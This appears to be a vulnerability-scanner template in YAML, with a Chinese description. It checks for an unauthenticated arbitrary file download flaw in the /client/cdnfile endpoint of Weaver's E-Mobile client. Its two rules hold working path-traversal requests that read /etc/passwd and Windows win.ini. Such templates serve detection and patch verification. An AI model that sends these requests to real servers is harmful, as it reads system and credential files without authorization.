id: e-mobile-client-filedownload

info:
  name: 泛微 E-mobile-client接口任意文件下载
  author: clearx
  severity: high
  verified: true
  description:
    泛微E-Mobile是一款移动办公解决方案，由上海泛微网络科技股份有限公司专业研发。
    这款软件旨在为手机、平板电脑等移动终端用户提供便捷的办公体验。
    在/client/cdnfile接口存在任意文件读取漏洞，攻击者可以未授权下载服务器上任意文件，造成信息泄露。
  reference:
    - https://mp.weixin.qq.com/s/ESqrOqA8LFq8GHj0TJ1rLA
  created: 2024/10/24

rules:
  r0:
    request:
      method: GET
      path: /client/cdnfile/C/etc/passwd?linux
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /client/cdnfile/1C/Windows/win.ini?windows
    expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")

expression: r0() || r1()
